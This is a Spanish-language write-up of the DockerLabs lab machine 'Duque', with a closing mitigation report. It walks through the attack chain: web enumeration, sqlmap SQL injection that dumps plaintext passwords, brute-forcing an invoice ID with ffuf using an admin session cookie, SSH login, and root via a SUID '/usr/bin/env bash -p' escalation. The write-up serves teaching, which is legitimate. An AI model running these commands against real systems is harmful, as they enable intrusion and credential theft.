# Duque

> Enumeración web con gobuster hasta un panel de facturación vulnerable a SQL injection, volcado de credenciales con sqlmap, fuerza bruta de un ID de factura con crunch + ffuf reutilizando la cookie de sesión, y escalada a root abusando del bit SUID en /usr/bin/env.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `Gobuster` · `SQLi` · `sqlmap` · `crunch` · `ffuf` · `Cookie de sesión` · `SSH` · `SUID` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sCV --open -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: NaturGas Solutions - Dashboard Corporativo
```

Dos puertos: SSH (22) y un portal corporativo, NaturGas Solutions (80). El SSH sin credenciales no me sirve todavía, así que la vía es la web.

## Enumeración web

```bash
$ gobuster dir -u http://172.17.0.2 -w directory-list-2.3-medium.txt -x php,html,txt,sh -t 50
index.php            (Status: 200) [Size: 11622]
intranet             (Status: 301)
bills                (Status: 301)
server-status        (Status: 403)
```

Aparecen `intranet` y, sobre todo, `bills` (facturas). Al entrar en `/bills/` me encuentro un panel de login: el objetivo perfecto para probar inyección SQL.

## SQL Injection con sqlmap

En vez de tantear la inyección a mano, le paso el formulario de login directamente a sqlmap con `--forms` (detecta y ataca los campos solo) y `--dbs` para listar las bases de datos.

```bash
$ sqlmap -u http://172.17.0.2/bills/index.php --forms --dbs --batch
Parameter: username (POST)
    Type: time-based blind / UNION query (3 columns)
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [5]: information_schema, register, mysql, performance_schema, sys
```

El campo `username` es inyectable. La base de datos interesante es `register`; vuelco su tabla `users`.

```bash
$ sqlmap -u http://172.17.0.2/bills/index.php -D register -T users --dump --forms --batch
+----+-----------+----------+
| id | passwd    | username |
+----+-----------+----------+
| 1  | mario123  | mario    |
| 2  | jesus2026 | jesus    |
| 3  | admin123  | admin    |
+----+-----------+----------+
```

Tres usuarios en claro. El que me interesa es **admin : admin123**, que me dará acceso al panel de administración.

## Acceso al panel y facturas

Inicio sesión en `/bills` como admin y entro al Panel de Gestión de Facturas. Cada factura se consulta con una URL del tipo `panel.php?id=xy****`: un prefijo fijo `xy` seguido de 4 caracteres. Existe una factura que no aparece en el listado y que guarda las credenciales del usuario **duque**. Voy a encontrar ese id por fuerza bruta.

## Fuerza bruta del ID de factura · crunch + ffuf

> **Nota.** crunch genera diccionarios a partir de un patrón: `crunch 4 4 -t @%%%` → exactamente 4 caracteres, donde `@` es una letra minúscula y `%` un número. Así `@%%%` genera una letra + tres números (a000 … z999): 26 000 combinaciones, justo el formato del id.

```bash
$ crunch 4 4 -t @%%% | ffuf -c -w - -b "PHPSESSID=02utmae17suvr9mpj4137arirc" -u "http://172.17.0.2/bills/panel.php?id=xyFUZZ" --fw 2616,2715
c724                    [Status: 200, Size: 5994, Words: 2624]
:: Progress: [26000/26000] :: 224 req/sec :: Duration: [0:00:04]
```

> **Nota.** Los tres flags clave de ffuf: `-w -` lee el diccionario desde stdin (lo que va escupiendo crunch por la tubería) · `-b "PHPSESSID=..."` adjunta mi cookie de sesión de admin, porque panel.php solo muestra las facturas si vas autenticado · `--fw 2616,2715` descarta las respuestas de 'factura no encontrada' por número de palabras, dejando solo el acierto real.

ffuf devuelve un único resultado: **c724**. La factura es, por tanto, `xyc724`.

## Credenciales de duque

Abro esa factura en el navegador (ya logueado como admin) en `panel.php?id=xyc724`. El detalle de factura me muestra directamente el usuario y la contraseña de duque: **duque : duquelaje81029557!**. (Con curl a pelo sale vacío porque panel.php necesita la cookie de sesión.)

## Acceso por SSH

```bash
$ ssh duque@172.17.0.2
duque@172.17.0.2's password: (duquelaje81029557!)
Welcome to Ubuntu 22.04.5 LTS
duque@721b3e16b85a:~$
```

## Escalada a root · SUID

```bash
$ find / -perm -4000 -ls 2>/dev/null
... /usr/bin/mount /usr/bin/su /usr/bin/passwd /usr/bin/sudo ...
1192985  44 -rwsr-xr-x  1 root root  43976  /usr/bin/env   <-- binario abusable
```

`/usr/bin/env` aparece con SUID. Según GTFOBins, con ese bit puedo lanzar un shell que herede los privilegios del propietario (root). El flag `-p` evita que bash descarte el EUID heredado.

```bash
$ /usr/bin/env /bin/bash -p
bash-5.1# whoami
root
```

Máquina Duque completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por bit SUID en /usr/bin/env

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** El binario env tiene el bit SUID de root: cualquier usuario local obtiene una shell como root en un solo paso.

**Mitigación.** Quitar el SUID (chmod u-s /usr/bin/env), auditar periódicamente los binarios SUID y aplicar el principio de mínimo privilegio.

### 🟠 ALTA — Inyección SQL en el panel de login

`CWE-89` · A03:2021 – Injection

**Impacto.** El parámetro 'username' no se sanea, lo que permite saltarse el login y, con sqlmap, volcar la base de datos completa (todos los usuarios y contraseñas).

**Mitigación.** Usar consultas parametrizadas (prepared statements) o un ORM; validar la entrada y aplicar el mínimo privilegio al usuario de base de datos.

### 🟡 MEDIA — Contraseñas almacenadas en texto plano

`CWE-256` · A02:2021 – Cryptographic Failures

**Impacto.** La tabla 'users' guarda las contraseñas en claro, así que al volcarla son directamente utilizables (mario123, admin123...).

**Mitigación.** Almacenar solo hashes con un algoritmo lento y con sal (bcrypt, argon2), nunca la contraseña en claro.

### 🟡 MEDIA — Referencia directa insegura al ID de factura (IDOR)

`CWE-639` · A01:2021 – Broken Access Control

**Impacto.** panel.php?id= usa un identificador adivinable y sin control de propiedad; por fuerza bruta se accede a una factura ajena que expone credenciales en claro.

**Mitigación.** Usar identificadores no predecibles (UUID), comprobar en el backend que la factura pertenece al usuario y no mostrar secretos en ella.

### 🟡 MEDIA — Reutilización de credenciales (web → SSH)

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La contraseña obtenida por la web sirve tal cual para el acceso por SSH del usuario duque.

**Mitigación.** Credenciales distintas por servicio, política de contraseñas robustas y MFA en accesos remotos.

---

_Writeup de **Duque** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
